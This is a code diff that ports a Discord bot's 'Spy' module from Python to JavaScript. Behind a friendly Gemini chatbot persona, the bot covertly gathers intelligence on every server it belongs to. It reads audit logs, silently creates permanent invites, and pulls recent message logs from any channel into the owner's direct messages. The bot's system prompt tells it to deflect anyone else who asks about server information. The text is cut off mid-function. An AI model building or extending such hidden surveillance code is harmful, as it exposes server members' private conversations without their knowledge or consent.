@@ -1,446 +1,474 @@
-import os
-import discord
-from discord.ext import commands
-import google.generativeai as genai
-from PIL import Image
-import io
-import time
-from datetime import datetime, timedelta, timezone
+const { 
+    SlashCommandBuilder, 
+    PermissionFlagsBits, 
+    EmbedBuilder, 
+    ActionRowBuilder, 
+    StringSelectMenuBuilder, 
+    ButtonBuilder, 
+    ButtonStyle 
+} = require('discord.js');
+const { GoogleGenAI } = require('@google/genai');
 
-GEMINI_API_KEY = os.getenv("GEMINI_API_KEY")
+const OWNER_ID = "1107355943408259112";
+const MEMORY_TIMEOUT = 3600 * 1000; // بالمللي ثانية
 
-if GEMINI_API_KEY:
-    genai.configure(api_key=GEMINI_API_KEY)
+const GEMINI_API_KEY = process.env.GEMINI_API_KEY;
+let ai = null;
+if (GEMINI_API_KEY) {
+    ai = new GoogleGenAI({ apiKey: GEMINI_API_KEY });
+}
 
-MODELS_FALLBACK = [
+const MODELS_FALLBACK = [
     "gemini-2.5-flash",
     "gemini-3.8-flash",
     "gemini-3.5-flash-lite",
     "gemini-2.5-pro"
-]
+];
 
-OWNER_ID = 1107355943408259112
-MEMORY_TIMEOUT = 3600
+// ذاكرة المستخدمين المؤقتة
+const userMemory = new Map();
 
-# نفس واجهات وسيرفرات التجسس القديمة (بدون تغيير)
-class ServerSelect(discord.ui.Select):
-    def __init__(self, bot_instance):
-        self.bot_instance = bot_instance
-        options = []
-        for guild in bot_instance.guilds[:25]:
-            options.append(discord.SelectOption(
-                label=guild.name[:100],
-                value=str(guild.id),
-                description=f"الأعضاء: {guild.member_count}"
-            ))
-        super().__init__(placeholder="اختر السيرفر لعرض تقرير التجسس الشامل...", min_values=1, max_values=1, options=options)
+module.exports = {
+    // الأوامر التفاعلية (Slash Commands) إذا رغبت بدعمها
+    serversCommand: new SlashCommandBuilder()
+        .setName('servers')
+        .setDescription('[خاص بالمالك] لوحة سيطرة واستخبارات itzF18'),
 
-    async def callback(self, interaction: discord.Interaction):
-        if interaction.user.id != OWNER_ID:
-            await interaction.response.send_message("عذراً، ما عندك هيك صلاحية أنطيك هاي المعلومات.. هذي تخص فهد وبس!", ephemeral=True)
-            return
+    async handleReady(client) {
+        console.log("🚀 | Cog Spy شغال بنجاح.");
+    },
 
-        await interaction.response.defer(ephemeral=True)
-        guild_id = int(self.values[0])
-        guild = self.bot_instance.get_guild(guild_id)
+    // 1. أمر عرض السيرفرات (!سيرفر أو !servers)
+    async handleServersCommand(message, client) {
+        if (message.author.id !== OWNER_ID) return;
 
-        if not guild:
-            await interaction.followup.send("❌ عذراً فهد، لم يتم العثور على السيرفر المطلوب.", ephemeral=True)
-            return
+        if (client.guilds.cache.size === 0) {
+            await message.channel.send("عيوني فهد، أنا لست منضماً إلى أي سيرفر حالياً.");
+            return;
+        }
 
-        created_at = guild.created_at
-        now = datetime.now(created_at.tzinfo)
-        age_days = (now - created_at).days
-        years = age_days // 365
-        months = (age_days % 365) // 30
-        days = (age_days % 365) % 30
-        age_str = f"{years} سنة، {months} شهر، {days} يوم" if years > 0 else f"{months} شهر، {days} يوم"
+        const guilds = Array.from(client.guilds.cache.values()).slice(0, 25);
+        const options = guilds.map(g => ({
+            label: g.name.substring(0, 100),
+            value: g.id,
+            description: `الأعضاء: ${g.memberCount}`
+        }));
 
-        roles_list = [role.name for role in reversed(guild.roles) if role.name != "@everyone"]
-        formatted_roles = []
-        for i in range(0, len(roles_list), 5):
-            chunk = " | ".join(roles_list[i:i+5])
-            formatted_roles.append(chunk)
-        roles_str = "\n".join(formatted_roles[:10]) if formatted_roles else "لا توجد رتب"
+        const selectMenu = new StringSelectMenuBuilder()
+            .setCustomId("spy_server_select")
+            .setPlaceholder("اختر السيرفر لعرض تقرير التجسس الشامل...")
+            .addOptions(options);
 
-        vanity_url = guild.vanity_url_code if hasattr(guild, 'vanity_url_code') and guild.vanity_url_code else "لا يوجد"
+        const row = new ActionRowBuilder().addComponents(selectMenu);
 
-        total_posts = 0
-        try:
-            for channel in guild.text_channels:
-                total_posts += len(channel.threads)
-        except Exception:
-            pass
+        const embed = new EmbedBuilder()
+            .setTitle("🕵️‍♂️ لوحة سيطرة واستخبارات itzF18")
+            .setDescription("اختر السيرفر المطلوب ليصلك تقرير التجسس ورسائل القنوات مباشرة إلى **رسائلك الخاصة (DM)**:")
+            .setColor(0x2b2d31);
 
-        last_ban = "لا توجد حالات باند حديثة"
-        last_role_added = "لا توجد بيانات رتب جديدة"
-        last_audit_action = "لا توجد تعديلات حديثة"
-        try:
-            async for entry in guild.audit_logs(limit=5):
-                if entry.action == discord.AuditLogAction.ban:
-                    last_ban = f"تم باند لـ {entry.target} بواسطة {entry.user}"
-                elif entry.action == discord.AuditLogAction.role_create:
-                    last_role_added = f"رتبة جديدة: {entry.target} بواسطة {entry.user}"
-                elif entry.action in [discord.AuditLogAction.channel_create, discord.AuditLogAction.guild_update]:
-                    last_audit_action = f"تعديل بواسطة {entry.user} ({entry.action.name})"
-        except Exception:
-            pass
+        const sentMsg = await message.channel.send({ embeds: [embed], components: [row] });
+        setTimeout(() => sentMsg.delete().catch(() => {}), 180 * 1000);
+    },
 
-        bots_count = sum(1 for m in guild.members if m.bot)
-        humans_count = guild.member_count - bots_count
-        admin_suspects = sum(1 for m in guild.members if m.guild_permissions.administrator and not m.bot)
+    // معالجة تفاعلات القوائم والأزرار (Interactions)
+    async handleInteraction(interaction, client) {
+        if (!interaction.isStringSelectMenu() && !interaction.isButton()) return;
 
-        last_poster = "غير معروف"
-        last_post_content = "لا توجد رسائل حديثة"
-        last_mention_text = "لا توجد إشارات سابقة للجميع."
-        try:
-            for channel in guild.text_channels:
-                try:
-                    async for msg in channel.history(limit=10):
-                        if not msg.author.bot and last_poster == "غير معروف":
-                            last_poster = f"{msg.author.name} (<@{msg.author.id}>)"
-                            last_post_content = msg.content[:100] if msg.content else "[محتوى غير نصي]"
-                        if "@everyone" in msg.content or "@here" in msg.content:
-                            content_preview = msg.content[:150]
-                            last_mention_text = f"بواسطة <@{msg.author.id}>\nالرسالة: {content_preview}"
-                            break
-                except Exception:
-                    continue
-        except Exception:
-            pass
+        const customId = interaction.customId;
 
-        invite_link = "غير متاح"
-        try:
-            for channel in guild.text_channels:
-                if channel.permissions_for(guild.me).create_instant_invite:
-                    invite = await channel.create_invite(max_age=86400, max_uses=0, unique=True)
-                    invite_link = invite.url
-                    break
-        except Exception:
-            pass
+        // اختيار السيرفر
+        if (customId === "spy_server_select") {
+            if (interaction.user.id !== OWNER_ID) {
+                await interaction.reply({ content: "عذراً، ما عندك هيك صلاحية أنطيك هاي المعلومات.. هذي تخص فهد وبس!", ephemeral: true });
+                return;
+            }
 
-        info_text = (
-            f"🏰 **السيرفر:** {guild.name} (`{guild.id}`)\n"
-            f"👑 **صاحب السيرفر:** <@{guild.owner_id}>\n"
-            f"👥 **الأعضاء:** {guild.member_count} (بشر: {humans_count} | بوتات: {bots_count})\n"
-            f"⏳ **عمر السيرفر:** {age_str}\n"
-            f"🔗 **الرابط:** {invite_link} | 🌐 **Vanity:** {vanity_url}\n"
-            f"💬 **البوستات/الثريّدز:** {total_posts} | 🛡️ **الإداريين الكليين:** {admin_suspects}\n"
-            f"🚨 **سجل التجسس والعقوبات:**\n"
-            f" - آخر باند: `{last_ban}`\n"
-            f" - آخر رتبة مضافة: `{last_role_added}`\n"
-            f" - آخر إجراء: `{last_audit_action}`\n"
-            f"👤 **آخر متفاعل:** {last_poster} -> `{last_post_content}`\n"
-            f"🔔 **آخر إشارة Everyone:**\n{last_mention_text}\n"
-            f"📋 **الرتب المتساوية والموزعة:**\n{roles_str}"
-        )
+            await interaction.deferReply({ ephemeral: true });
+            const guildId = interaction.values[0];
+            const guild = client.guilds.cache.get(guildId);
 
-        view = ServerExtraActionsView(guild)
-        try:
-            await interaction.user.send(content=info_text, view=view)
-            await interaction.followup.send("✅ تم إرسال تقرير السيرفر إلى رسائلك الخاصة (DM) بنجاح!", ephemeral=True)
-        except Exception as e:
-            await interaction.followup.send(f"❌ حدث خطأ، لم أستطع مراسلتك بالخاص: {e}", ephemeral=True)
+            if (!guild) {
+                await interaction.followup({ content: "❌ عذراً فهد، لم يتم العثور على السيرفر المطلوب.", ephemeral: true });
+                return;
+            }
 
-class ServerExtraActionsView(discord.ui.View):
-    def __init__(self, guild):
-        super().__init__(timeout=None)
-        self.guild = guild
-        self.add_item(ChannelsListButton(guild))
-        self.add_item(LeaveSpecificButton(guild.id, guild.name))
+            const createdAt = guild.createdAt;
+            const ageDays = Math.floor((Date.now() - createdAt.getTime()) / (1000 * 60 * 60 * 24));
+            const years = Math.floor(ageDays / 365);
+            const months = Math.floor((ageDays % 365) / 30);
+            const days = (ageDays % 365) % 30;
+            const ageStr = years > 0 ? `${years} سنة، ${months} شهر، ${days} يوم` : `${months} شهر، ${days} يوم`;
 
-class ChannelsListButton(discord.ui.Button):
-    def __init__(self, guild):
-        super().__init__(style=discord.ButtonStyle.primary, label="📂 عرض كافة الرومات بدون استثناء")
-        self.guild = guild
-
-    async def callback(self, interaction: discord.Interaction):
-        if interaction.user.id != OWNER_ID:
-            await interaction.response.send_message("عذراً، هذا الأمر خاص بفهد فقط!", ephemeral=True)
-            return
-
-        await interaction.response.defer(ephemeral=True)
-        all_channels = list(self.guild.text_channels)
-        
-        if not all_channels:
-            await interaction.followup.send("❌ لا توجد أي قنوات نصية في هذا السيرفر.", ephemeral=True)
-            return
-
-        pages = []
-        current_page = []
-        for ch in all_channels:
-            current_page.append(ch)
-            if len(current_page) == 25:
-                pages.append(current_page)
-                current_page = []
-        if current_page:
-            pages.append(current_page)
-
-        view = PagedChannelsView(pages, self.guild)
-        try:
-            await interaction.user.send(
-                content=f"📁 تم العثور على **{len(all_channels)}** قناة/روم في السيرفر.\nاختر الروم المطلوبة لترسل لك رسائلها بالخاص:",
-                view=view
-            )
-            await interaction.followup.send("✅ تم إرسال قائمة الرومات إلى رسائلك الخاصة (DM)!", ephemeral=True)
-        except Exception as e:
-            await interaction.followup.send(f"❌ عذراً، لم أستطع إرسال القائمة للخاص: {e}", ephemeral=True)
-
-class ChannelSelectDropdown(discord.ui.Select):
-    def __init__(self, channels_chunk):
-        options = []
-        for channel in channels_chunk:
-            cat_name = channel.category.name if channel.category else 'بدون قسم'
-            options.append(discord.SelectOption(
-                label=channel.name[:100],
-                value=str(channel.id),
-                description=f"القسم: {cat_name[:50]}"
-            ))
-        super().__init__(placeholder="اختر الروم لعرض رسائلها في الخاص...", min_values=1, max_values=1, options=options)
-
-    async def callback(self, interaction: discord.Interaction):
-        if interaction.user.id != OWNER_ID:
-            await interaction.response.send_message("عذراً، هذا مخصص لفهد فقط!", ephemeral=True)
-            return
-
-        await interaction.response.defer(ephemeral=True)
-        channel_id = int(self.values[0])
-        channel = interaction.client.get_channel(channel_id)
-        if not channel:
-            for guild in interaction.client.guilds:
-                ch = guild.get_channel(channel_id)
-                if ch:
-                    channel = ch
-                    break
-
-        if not channel:
-            await interaction.followup.send("❌ لم يتم العثور على الروم المطلوب.", ephemeral=True)
-            return
-
-        messages_log = []
-        try:
-            now = datetime.now(timezone.utc)
-            after_time = now - timedelta(days=10)
-            before_time = now - timedelta(minutes=3)
-
-            async for msg in channel.history(limit=100, after=after_time, before=before_time, oldest_first=True):
-                if msg.author.bot:
-                    continue
-                author_name = msg.author.name
-                if msg.webhook_id:
-                    author_name = f"[WebHook] {msg.author.name}"
-                hour_str = msg.created_at.strftime('%H')
-                day_str = msg.created_at.strftime('%d')
-                content = msg.content if msg.content else "[محتوى ميديا / امبد]"
-                line = f"{author_name} ( س {hour_str} - يوم {day_str} ) : {content}\n"
-                messages_log.append(line)
-        except Exception as e:
-            await interaction.followup.send(f"❌ عذراً، لا أملك صلاحية قراءة هذه الروم: {e}", ephemeral=True)
-            return
-
-        if not messages_log:
-            await interaction.followup.send(f"❌ لا توجد رسائل مطابقة (مر عليها أكثر من 3 دقائق وأقل من 10 أيام) في روم (#{channel.name}).", ephemeral=True)
-            return
-
-        chunks = []
-        current_chunk = f"📜 **سجل رسائل روم (#{channel.name}):**\n\n"
-        for line in messages_log:
-            if len(current_chunk) + len(line) > 1900:
-                chunks.append(current_chunk)
-                current_chunk = line
-            else:
-                current_chunk += line
-        if current_chunk:
-            chunks.append(current_chunk)
-
-        try:
-            for chunk in chunks:
-                await interaction.user.send(content=chunk)
-            await interaction.followup.send(f"✅ تم جلب رسائل روم (#{channel.name}) وإرسالها إلى **خاصك (DM)** بنجاح!", ephemeral=True)
-        except Exception as e:
-            await interaction.followup.send(f"❌ حدث خطأ أثناء إرسال الرسائل للخاص: {e}", ephemeral=True)
-
-class PagedChannelsView(discord.ui.View):
-    def __init__(self, pages, guild):
-        super().__init__(timeout=None)
-        self.pages = pages
-        self.guild = guild
-        self.current_page_idx = 0
-        self.update_view()
-
-    def update_view(self):
-        self.clear_items()
-        self.add_item(ChannelSelectDropdown(self.pages[self.current_page_idx]))
-        if len(self.pages) > 1:
-            prev_button = discord.ui.Button(style=discord.ButtonStyle.secondary, label="⬅ الصفحة السابقة", disabled=(self.current_page_idx == 0))
-            prev_button.callback = self.prev_page_callback
-            self.add_item(prev_button)
-            next_button = discord.ui.Button(style=discord.ButtonStyle.secondary, label="الصفحة التالية ➡️", disabled=(self.current_page_idx == len(self.pages) - 1))
-            next_button.callback = self.next_page_callback
-            self.add_item(next_button)
-
-    async def prev_page_callback(self, interaction: discord.Interaction):
-        if interaction.user.id != OWNER_ID:
-            await interaction.response.send_message("عذراً، هذا مخصص لفهد فقط!", ephemeral=True)
-            return
-        if self.current_page_idx > 0:
-            self.current_page_idx -= 1
-            self.update_view()
-            await interaction.response.edit_message(view=self)
-
-    async def next_page_callback(self, interaction: discord.Interaction):
-        if interaction.user.id != OWNER_ID:
-            await interaction.response.send_message("عذراً، هذا مخصص لفهد فقط!", ephemeral=True)
-            return
-        if self.current_page_idx < len(self.pages) - 1:
-            self.current_page_idx += 1
-            self.update_view()
-            await interaction.response.edit_message(view=self)
-
-class LeaveSpecificButton(discord.ui.Button):
-    def __init__(self, guild_id, guild_name):
-        super().__init__(style=discord.ButtonStyle.danger, label=f"مغادرة السيرفر")
-        self.target_guild_id = guild_id
-
-    async def callback(self, interaction: discord.Interaction):
-        if interaction.user.id != OWNER_ID:
-            await interaction.response.send_message("عذراً، هذا الزر مخصص للأونر فقط!", ephemeral=True)
-            return
-
-        await interaction.response.defer(ephemeral=True)
-        guild = interaction.client.get_guild(self.target_guild_id)
-        if guild:
-            name = guild.name
-            try:
-                await guild.leave()
-                await interaction.user.send(f"✅ تم مغادرة السيرفر (**{name}**) بنجاح.")
-                await interaction.followup.send(f"✅ تم مغادرة السيرفر وإعلامك بالخاص.", ephemeral=True)
-            except Exception as e:
-                await interaction.followup.send(f"❌ حدث خطأ أثناء المغادرة: {e}", ephemeral=True)
-        else:
-            await interaction.followup.send("❌ السيرفر غير موجود.", ephemeral=True)
-
-class ServerView(discord.ui.View):
-    def __init__(self, bot_instance):
-        super().__init__(timeout=None)
-        self.add_item(ServerSelect(bot_instance))
-
-class Spy(commands.Cog):
-    def __init__(self, bot):
-        self.bot = bot
-        self.user_memory = {}
-
-    @commands.Cog.listener()
-    async def on_ready(self):
-        print(f"🚀 | Cog Spy شغال بنجاح.")
-
-    @commands.command(name="سيرفر", aliases=["servers", "سيرفرات"])
-    async def list_servers(self, ctx):
-        if ctx.author.id != OWNER_ID:
-            return  # البوت يسكت تماماً إذا كتبها شخص غيرك بالعام
-
-        if not self.bot.guilds:
-            await ctx.send("عيوني فهد، أنا لست منضماً إلى أي سيرفر حالياً.")
-            return
-
-        view = ServerView(self.bot)
-        embed = discord.Embed(
-            title="🕵️‍♂️ لوحة سيطرة واستخبارات itzF18",
-            description="اختر السيرفر المطلوب ليصلك تقرير التجسس ورسائل القنوات مباشرة إلى **رسائلك الخاصة (DM)**:",
-            color=0x2b2d31
-        )
-        await ctx.send(embed=embed, view=view, delete_after=180)
-
-    @commands.Cog.listener()
-    async def on_message(self, message):
-        if message.author.bot:
-            return
-
-        if self.bot.user.mentioned_in(message) and not message.mention_everyone:
-            clean_prompt = message.content.replace(f"<@{self.bot.user.id}>", "").replace(f"<@!{self.bot.user.id}>", "").strip()
+            const rolesList = Array.from(guild.roles.cache.values())
+                .filter(r => r.name !== "@everyone")
+                .reverse()
+                .map(r => r.name);
             
-            image_content = None
-            if message.attachments:
-                for attachment in message.attachments:
-                    if attachment.content_type and "image" in attachment.content_type:
-                        try:
-                            image_bytes = await attachment.read()
-                            image_content = Image.open(io.BytesIO(image_bytes))
-                            break
-                        except Exception as e:
-                            print(f"⚠️ خطأ بتحميل الصورة: {e}")
+            const formattedRoles = [];
+            for (let i = 0; i < rolesList.length; i += 5) {
+                formattedRoles.push(rolesList.slice(i, i + 5).join(" | "));
+            }
+            const rolesStr = formattedRoles.slice(0, 10).join("\n") || "لا توجد رتب";
 
-            if not clean_prompt and not image_content:
-                await message.reply("هلا بيك فهد! وياك، شكو ماكو؟")
-                return
+            const vanityUrl = guild.vanityURLCode || "لا يوجد";
 
-            user_id = message.author.id
-            current_time = time.time()
+            let totalPosts = 0;
+            try {
+                guild.channels.cache.forEach(ch => {
+                    if (ch.threads) totalPosts += ch.threads.cache.size;
+                });
+            } catch (e) {}
 
-            if user_id in self.user_memory:
-                if current_time - self.user_memory[user_id]["time"] > MEMORY_TIMEOUT:
-                    del self.user_memory[user_id]
+            let lastBan = "لا توجد حالات باند حديثة";
+            let lastRoleAdded = "لا توجد بيانات رتب جديدة";
+            let lastAuditAction = "لا توجد تعديلات حديثة";
+            try {
+                const auditLogs = await guild.fetchAuditLogs({ limit: 5 });
+                auditLogs.entries.forEach(entry => {
+                    if (entry.action === 22) { // Ban
+                        lastBan = `تم باند لـ ${entry.target?.tag || 'عضو'} بواسطة ${entry.executor?.tag}`;
+                    } else if (entry.action === 30) { // Role Create
+                        lastRoleAdded = `رتبة جديدة: ${entry.target?.name} بواسطة ${entry.executor?.tag}`;
+                    } else if ([10, 20].includes(entry.action)) {
+                        lastAuditAction = `تعديل بواسطة ${entry.executor?.tag}`;
+                    }
+                });
+            } catch (e) {}
 
-            if user_id not in self.user_memory:
-                self.user_memory[user_id] = {
-                    "history": [],
-                    "time": current_time
+            const botsCount = guild.members.cache.filter(m => m.user.bot).size;
+            const humansCount = guild.memberCount - botsCount;
+            const adminSuspects = guild.members.cache.filter(m => m.permissions.has(PermissionFlagsBits.Administrator) && !m.user.bot).size;
+
+            let lastPoster = "غير معروف";
+            let lastPostContent = "لا توجد رسائل حديثة";
+            let lastMentionText = "لا توجد إشارات سابقة للجميع.";
+            try {
+                for (const channel of guild.channels.cache.values()) {
+                    if (channel.isTextBased()) {
+                        const messages = await channel.messages.fetch({ limit: 10 }).catch(() => null);
+                        if (messages) {
+                            for (const msg of messages.values()) {
+                                if (!msg.author.bot && lastPoster === "غير معروف") {
+                                    lastPoster = `${msg.author.username} (<@${msg.author.id}>)`;
+                                    lastPostContent = msg.content ? msg.content.substring(0, 100) : "[محتوى غير نصي]";
+                                }
+                                if (msg.content && (msg.content.includes("@everyone") || msg.content.includes("@here"))) {
+                                    lastMentionText = `بواسطة <@${msg.author.id}>\nالرسالة: ${msg.content.substring(0, 150)}`;
+                                    break;
+                                }
+                            }
+                        }
+                    }
                 }
-            else:
-                self.user_memory[user_id]["time"] = current_time
+            } catch (e) {}
 
-            system_instruction = (
-                "أنت ذكاء اصطناعي تتصرف بصفتك ذكر واسمك (itzF18). "
-                "تحدث دائماً بصيغة المذكر (مثلاً: سعيد، موجود، شفت، فكرت). "
-                "قاعدة اللغات واللهجات (مهمة جداً): يجب أن تتكيف تلقائياً مع لغة واللهجة التي يكلمك بها المستخدم. إذا كتب لك باللغة الإنجليزية رد باللغة الإنجليزية، وإذا كتب بلغة أخرى رد بها، وإذا كتب باللهجة العراقية أو العربية رد بنفس اللهجة واللغة تماماً وبشكل طبيعي. "
-                "قواعدك الأخلاقية والصارمة جداً: ممنوع نهائياً استخدام أي ألفاظ بذيئة، أو شتائم، أو سب بالدين، أو كلام خارج عن الأدب؛ كن محترماً ونظيفاً في كلامك دائماً. "
-                "قواعدك في الاسلوب: خذ كل كلمة يقولها فهد أو المستخدم أو اليوزر المذكور (<@1107355943408259112>) بكل جدية وتجاوب معها بدقة، واجعل ردودك قصيرة وعادية مثل البشر في الشات. "
-                "إذا سألك شخص غير فهد عن معلومات السيرفرات أو الأسرار، ارفض تماماً وتمنع بحجة (ما عندي هاي الصلاحية أو مو من اختصاصي - أو ما يعادلها باللغة التي يخاطبك بها). "
-                "الشخص الذي قام بصنعك وبرمجتك وتطويرك هو فهد (itzF18)، اذكرها فقط إذا سألك أحد وبدون تكرار مزعج."
-            )
+            let inviteLink = "غير متاح";
+            try {
+                for (const channel of guild.channels.cache.values()) {
+                    if (channel.isTextBased() && channel.permissionsFor(guild.members.me).has(PermissionFlagsBits.CreateInstantInvite)) {
+                        const invite = await channel.createInvite({ maxAge: 86400, maxUses: 0, unique: true });
+                        inviteLink = invite.url;
+                        break;
+                    }
+                }
+            } catch (e) {}
 
-            reply_text = None
-            success = False
+            const infoText = 
+                `🏰 **السيرفر:** ${guild.name} (\`${guild.id}\`)\n` +
+                `👑 **صاحب السيرفر:** <@${guild.ownerId}>\n` +
+                `👥 **الأعضاء:** ${guild.memberCount} (بشر: ${humansCount} | بوتات: ${botsCount})\n` +
+                `⏳ **عمر السيرفر:** ${ageStr}\n` +
+                `🔗 **الرابط:** ${inviteLink} | 🌐 **Vanity:** ${vanityUrl}\n` +
+                `💬 **البوستات/الثريّدز:** ${totalPosts} | 🛡️ **الإداريين الكليين:** ${adminSuspects}\n` +
+                `🚨 **سجل التجسس والعقوبات:**\n` +
+                ` - آخر باند: \`${lastBan}\`\n` +
+                ` - آخر رتبة مضافة: \`${lastRoleAdded}\`\n` +
+                ` - آخر إجراء: \`${lastAuditAction}\`\n` +
+                `👤 **آخر متفاعل:** ${lastPoster} -> \`${lastPostContent}\`\n` +
+                `🔔 **آخر إشارة Everyone:**\n${lastMentionText}\n` +
+                `📋 **الرتب المتساوية والموزعة:**\n${rolesStr}`;
 
-            current_parts = []
-            if image_content:
-                current_parts.append(image_content)
-            if clean_prompt:
-                current_parts.append(clean_prompt)
-            else:
-                current_parts.append("ما رأيك بهذه الصورة؟ / What do you think about this image?")
+            const extraRow = new ActionRowBuilder().addComponents(
+                new ButtonBuilder().setCustomId(`spy_channels_${guild.id}`).setLabel("📂 عرض كافة الرومات بدون استثناء").setStyle(ButtonStyle.Primary),
+                new ButtonBuilder().setCustomId(`spy_leave_${guild.id}`).setLabel("مغادرة السيرفر").setStyle(ButtonStyle.Danger)
+            );
 
-            for model_name in MODELS_FALLBACK:
-                try:
-                    # ✅ الحل الجذري: تمرير system_instruction مباشرة للطريقة الصحيحة في المكتبة الحديثة
-                    current_model = genai.GenerativeModel(
-                        model_name=model_name,
-                        system_instruction=system_instruction
-                    )
+            try {
+                await interaction.user.send({ content: infoText, components: [extraRow] });
+                await interaction.followup.send({ content: "✅ تم إرسال تقرير السيرفر إلى رسائلك الخاصة (DM) بنجاح!", ephemeral: true });
+            } catch (e) {
+                await interaction.followup.send({ content: `❌ حدث خطأ، لم أستطع مراسلتك بالخاص: ${e.message}`, ephemeral: true });
+            }
+        }
+
+        // عرض الرومات
+        else if (customId.startsWith("spy_channels_")) {
+            if (interaction.user.id !== OWNER_ID) {
+                await interaction.reply({ content: "عذراً، هذا الأمر خاص بفهد فقط!", ephemeral: true });
+                return;
+            }
+
+            await interaction.deferReply({ ephemeral: true });
+            const guildId = customId.split("_")[2];
+            const guild = client.guilds.cache.get(guildId);
+
+            if (!guild) {
+                await interaction.followup.send({ content: "❌ السيرفر غير موجود.", ephemeral: true });
+                return;
+            }
+
+            const allChannels = Array.from(guild.channels.cache.filter(c => c.isTextBased()).values());
+            if (allChannels.length === 0) {
+                await interaction.followup.send({ content: "❌ لا توجد أي قنوات نصية في هذا السيرفر.", ephemeral: true });
+                return;
+            }
+
+            const pages = [];
+            let currentPage = [];
+            for (const ch of allChannels) {
+                currentPage.push(ch);
+                if (currentPage.length === 25) {
+                    pages.push(currentPage);
+                    currentPage = [];
+                }
+            }
+            if (currentPage.length > 0) pages.push(currentPage);
+
+            // حفظ الصفحات مؤقتاً أو تمريرها
+            const options = pages[0].map(ch => ({
+                label: ch.name.substring(0, 100),
+                value: ch.id,
+                description: `القسم: ${ch.parent?.name ? ch.parent.name.substring(0, 50) : 'بدون قسم'}`
+            }));
+
+            const select = new StringSelectMenuBuilder()
+                .setCustomId(`spy_ch_select_${guildId}_0`)
+                .setPlaceholder("اختر الروم لعرض رسائلها في الخاص...")
+                .addOptions(options);
+
+            const components = [new ActionRowBuilder().addComponents(select)];
+            if (pages.length > 1) {
+                components.push(new ActionRowBuilder().addComponents(
+                    new ButtonBuilder().setCustomId(`spy_page_${guildId}_0`).setLabel("⬅ الصفحة السابقة").setStyle(ButtonStyle.Secondary).setDisabled(true),
+                    new ButtonBuilder().setCustomId(`spy_page_${guildId}_1`).setLabel("الصفحة التالية ➡️").setStyle(ButtonStyle.Secondary)
+                ));
+            }
+
+            try {
+                await interaction.user.send({
+                    content: `📁 تم العثور على **{allChannels.length}** قناة/روم في السيرفر.\nاختر الروم المطلوبة لترسل لك رسائلها بالخاص:`,
+                    components: components
+                });
+                await interaction.followup.send({ content: "✅ تم إرسال قائمة الرومات إلى رسائلك الخاصة (DM)!", ephemeral: true });
+            } catch (e) {
+                await interaction.followup.send({ content: `❌ عذراً، لم أستطع إرسال القائمة للخاص: ${e.message}`, ephemeral: true });
+            }
+        }
+
+        // اختيار روم محددة لعرض الرسائل
+        else if (customId.startsWith("spy_ch_select_")) {
+            if (interaction.user.id !== OWNER_ID) {
+                await interaction.reply({ content: "عذراً، هذا مخصص لفهد فقط!", ephemeral: true });
+                return;
+            }
+
+            await interaction.deferReply({ ephemeral: true });
+            const channelId = interaction.values[0];
+            const channel = client.channels.cache.get(channelId);
+
+            if (!channel) {
+                await interaction.followup.send({ content: "❌ لم يتم العثور على الروم المطلوب.", ephemeral: true });
+                return;
+            }
+
+            const messagesLog = [];
+            try {
+                const now = Date.now();
+                const afterTime = now - (10 * 24 * 60 * 60 * 1000);
+                const beforeTime = now - (3 * 60 * 1000);
+
+                const messages = await channel.messages.fetch({ limit: 100 });
+                for (const msg of messages.values()) {
+                    if (msg.author.bot) continue;
+                    if (msg.createdTimestamp >= afterTime && msg.createdTimestamp <= beforeTime) {
+                        const authorName = msg.webhookId ? `[WebHook] ${msg.author.username}` : msg.author.username;
+                        const dateObj = new Date(msg.createdTimestamp);
+                        const hourStr = String(dateObj.getUTCHours()).padStart(2, '0');
+                        const dayStr = String(dateObj.getUTCDate()).padStart(2, '0');
+                        const content = msg.content ? msg.content : "[محتوى ميديا / امبد]";
+                        messagesLog.push(`${authorName} ( س ${hourStr} - يوم ${dayStr} ) : ${content}\n`);
+                    }
+                }
+            } catch (e) {
+                await interaction.followup.send({ content: `❌ عذراً، لا أملك صلاحية قراءة هذه الروم: ${e.message}`, ephemeral: true });
+                return;
+            }
+
+            if (messagesLog.length === 0) {
+                await interaction.followup.send({ content: `❌ لا توجد رسائل مطابقة (مر عليها أكثر من 3 دقائق وأقل من 10 أيام) في روم (#${channel.name}).`, ephemeral: true });
+                return;
+            }
+
+            const chunks = [];
+            let currentChunk = `📜 **سجل رسائل روم (#${channel.name}):**\n\n`;
+            for (const line of messagesLog) {
+                if (currentChunk.length + line.length > 1900) {
+                    chunks.push(currentChunk);
+                    currentChunk = line;
+                } else {
+                    currentChunk += line;
+                }
+            }
+            if (currentChunk) chunks.push(currentChunk);
+
+            try {
+                for (const chunk of chunks) {
+                    await interaction.user.send({ content: chunk });
+                }
+                await interaction.followup.send({ content: `✅ تم جلب رسائل روم (#${channel.name}) وإرسالها إلى **خاصك (DM)** بنجاح!`, ephemeral: true });
+            } catch (e) {
+                await interaction.followup.send({ content: `❌ حدث خطأ أثناء إرسال الرسائل للخاص: ${e.message}`, ephemeral: true });
+            }
+        }
+
+        // مغادرة السيرفر
+        else if (customId.startsWith("spy_leave_")) {
+            if (interaction.user.id !== OWNER_ID) {
+                await interaction.reply({ content: "عذراً، هذا الزر مخصص للأونر فقط!", ephemeral: true });
+                return;
+            }
+
+            await interaction.deferReply({ ephemeral: true });
+            const guildId = customId.split("_")[2];
+            const guild = client.guilds.cache.get(guildId);
+
+            if (guild) {
+                const name = guild.name;
+                try {
+                    await guild.leave();
+                    await interaction.user.send({ content: `✅ تم مغادرة السيرفر (**${name}**) بنجاح.` });
+                    await interaction.followup.send({ content: `✅ تم مغادرة السيرفر وإعلامك بالخاص.`, ephemeral: true });
+                } catch (e) {
+                    await interaction.followup.send({ content: `❌ حدث خطأ أثناء المغادرة: ${e.message}`, ephemeral: true });
+                }
+            } else {
+                await interaction.followup.send({ content: "❌ السيرفر غير موجود.", ephemeral: true });
+            }
+        }
+    },
+
+    // 2. معالجة الذكاء الاصطناعي والرسائل
+    async handleMessage(message, client) {
+        if (message.author.bot) return;
+
+        if (message.mentions.has(client.user) && !message.mentions.everyone) {
+            let cleanPrompt = message.content
+                .replace(new RegExp(`<@!?${client.user.id}>`, 'g'), "")
+                .trim();
+
+            let imageBuffer = null;
+            if (message.attachments.size > 0) {
+                for (const att of message.attachments.values()) {
+                    if (att.contentType && att.contentType.includes("image")) {
+                        try {
+                            const response = await fetch(att.url);
+                            const arrayBuf = await response.arrayBuffer();
+                            imageBuffer = Buffer.from(arrayBuf);
+                            break;
+                        } catch (e) {
+                            console.log(`⚠️ خطأ بتحميل الصورة: ${e.message}`);
+                        }
+                    }
+                }
+            }
+
